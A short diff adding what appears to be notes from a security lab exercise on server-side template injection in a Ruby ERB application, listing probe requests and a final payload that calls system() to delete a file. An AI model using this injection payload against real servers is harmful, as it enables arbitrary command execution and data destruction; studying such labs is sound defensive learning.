@@ -1,0 +1,14 @@
+// When sending commonly used template characters, all exception raised
+GET /?message=${{<%[%'"}}%\ HTTP/1.1
+
+// When sending Ruby ERB opening expression tag, the output went missing
+GET /?message=<%= HTTP/1.1
+
+// When seinding ERB mathmatical complete expression tag (<%= 7*7 %>), evaluated successfully
+GET /?message=<%25%3d+7*7+%25> HTTP/1.1
+// Must URL encode coz containing URL special character; =
+
+// Read Ruby documentation and found out that system() built-in function and execute arbitrary OS commands
+// <%= system("rm /home/carlos/morale.txt") %>
+// returns ture and printed in response
+
